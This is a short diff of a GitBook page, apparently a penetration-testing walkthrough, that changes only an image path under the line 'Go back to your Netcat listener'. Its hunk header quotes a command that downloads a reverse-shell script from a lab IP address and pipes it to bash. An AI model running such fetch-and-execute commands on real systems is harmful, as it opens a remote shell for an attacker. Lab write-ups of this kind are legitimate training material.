@@ -104,4 +104,4 @@ curl 192.168.49.90/rev_shell | bash
 
 Go back to your Netcat listener:
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
